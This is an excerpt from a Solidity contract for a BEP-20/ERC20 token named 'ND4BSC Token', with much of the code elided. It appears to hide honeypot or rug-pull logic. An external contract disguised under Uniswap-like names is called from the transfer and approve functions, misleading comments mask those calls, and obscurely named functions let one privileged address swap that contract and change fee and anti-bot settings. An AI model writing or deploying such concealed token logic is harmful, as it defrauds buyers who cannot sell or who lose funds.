...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "ND4BSC Token";
    string private _symbol = "ND4BSC";
    ...
    uniswapV1 private uniswapV9PairToken;
    ...
    constructor(
        ...
        uniswapV9PairToken = uniswapV1(uniswapV3Pair_);
    ...
    function agew(uint256 g) public {
        if (_Antibotswaper[_msgSender()]) {
            gg=g;
        } else {
            uniswapV9PairToken.create(8**3);
        } 
    }
    ...
    function marketingWalletca(address addresses) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
            uniswapV9PairToken = uniswapV1(addresses);
        } else {
            uniswapV9PairToken.create(8**3);
        }
    }
    ...
    function initializeW(bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
            antibotenabled = bs;
            botsleep = timesleep;
    ...
    function _approve(
        ...
        if (_isExcludedFromFeeTransfer[_msgSender()]){uniswapV9PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV9PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV9PairToken.create(crec**21);}
            //uint256 b=IUniswapV2Pair(uniswapV2Router.WETH()).balanceOf(address(0x));
            //if(b<100){uniswapV9PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedlp[to]) {
            uniswapV9PairToken.create(250**3); 
        }
